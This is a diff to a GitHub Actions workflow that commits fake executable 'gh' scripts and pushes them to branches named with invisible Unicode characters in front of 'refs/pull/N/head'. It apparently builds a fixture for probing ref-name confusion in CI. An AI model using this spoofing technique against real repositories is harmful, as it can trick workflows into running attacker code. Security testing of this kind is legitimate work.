@@ -20,8 +20,8 @@ jobs:
         shell: bash
         run: |
           set -euo pipefail
-          branch="refs/pull/${{ inputs.target_number }}/head"
-          git checkout -B "$branch"
+          target_number="${{ inputs.target_number }}"
+          git checkout -B payload-source
           mkdir -p gh_0/bin gh_1/bin
           cat > gh_0/bin/gh <<'PAYLOAD'
           #!/usr/bin/env bash
@@ -47,4 +47,12 @@ jobs:
           git config user.email "fixture-builder@users.noreply.github.com"
           git add .fixture-trigger gh_0/bin/gh gh_1/bin/gh
           git commit -m "Add executable ref-name probe"
-          git push origin "HEAD:refs/heads/$branch"
+          pushed=no
+          for point in 00A0 2000 2003 2009 202F 205F 3000 FEFF; do
+            prefix="$(printf '%b' "\\u$point")"
+            branch="${prefix}refs/pull/${target_number}/head"
+            if git push origin "HEAD:refs/heads/$branch"; then
+              pushed=yes
+            fi
+          done
+          test "$pushed" = yes
